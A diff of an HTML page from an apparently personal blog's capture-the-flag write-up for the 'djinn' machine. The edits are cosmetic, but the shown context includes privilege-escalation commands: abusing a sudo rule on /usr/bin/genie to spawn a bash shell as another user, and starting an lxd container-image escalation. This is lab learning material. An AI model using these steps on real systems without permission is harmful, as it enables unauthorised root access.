@@ -8,7 +8,7 @@
   <link rel="stylesheet" type="text/css" href="/css/style.css">
   <link rel="preconnect" href="https://fonts.gstatic.com"> 
   <link
-  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Roboto+Mono&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
   rel="stylesheet"> 
   <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
@@ -22,6 +22,7 @@
 
 </head>
 
+<body>
 <!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
 <pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
  ___               _   ___   ___ 
@@ -226,8 +227,8 @@ And don&#39;t mess up anything.</code></pre></li>
 <div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nitish@djinn:~$</span> sudo <span class="at">-u</span> sam /usr/bin/genie <span class="at">-p</span> /bin/bash <span class="at">-cmd</span> ls</span>
 <span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">my</span> man!!</span>
 <span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> id</span>
-<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="va">uid=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span> <span class="va">gid=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span></span>
-<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="va">groups=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span><span class="ex">,4</span><span class="er">(</span><span class="ex">adm</span><span class="kw">)</span><span class="ex">,24</span><span class="er">(</span><span class="ex">cdrom</span><span class="kw">)</span><span class="ex">,30</span><span class="er">(</span><span class="ex">dip</span><span class="kw">)</span><span class="ex">,46</span><span class="er">(</span><span class="ex">plugdev</span><span class="kw">)</span><span class="ex">,108</span><span class="er">(</span><span class="ex">lxd</span><span class="kw">)</span><span class="ex">,113</span><span class="er">(</span><span class="ex">lpadmin</span><span class="kw">)</span><span class="ex">,114</span><span class="er">(</span><span class="ex">sambashare</span><span class="kw">)</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span><span class="ex">,4</span><span class="er">(</span><span class="ex">adm</span><span class="kw">)</span><span class="ex">,24</span><span class="er">(</span><span class="ex">cdrom</span><span class="kw">)</span><span class="ex">,30</span><span class="er">(</span><span class="ex">dip</span><span class="kw">)</span><span class="ex">,46</span><span class="er">(</span><span class="ex">plugdev</span><span class="kw">)</span><span class="ex">,108</span><span class="er">(</span><span class="ex">lxd</span><span class="kw">)</span><span class="ex">,113</span><span class="er">(</span><span class="ex">lpadmin</span><span class="kw">)</span><span class="ex">,114</span><span class="er">(</span><span class="ex">sambashare</span><span class="kw">)</span></span>
 <span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span></span></code></pre></div>
 <h1 id="privilege-escalation---root">Privilege Escalation - Root</h1>
 <h2 id="first-way---sudo-permissions">First way - sudo permissions</h2>
@@ -315,7 +316,7 @@ And don&#39;t mess up anything.</code></pre></li>
 <p>Now let’s add this image to the lxd list</p>
 <div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> image import ./alpine-v3.12-x86_64-20200706_0859.tar.gz <span class="at">--alias</span> pwn</span></code></pre></div>
 <p>We got a permission denied saying that we cannot write to /home/nitish/.config. So our home directory is not right. So we run the following</p>
-<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">HOME=</span>/home/sam</span>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">HOME</span><span class="op">=</span>/home/sam</span>
 <span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> image import ./alpine-v3.12-x86_64-20200706_0859.tar.gz <span class="at">--alias</span> pwn</span>
 <span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> image list</span></code></pre></div>
 <p>And now we succeed.</p>
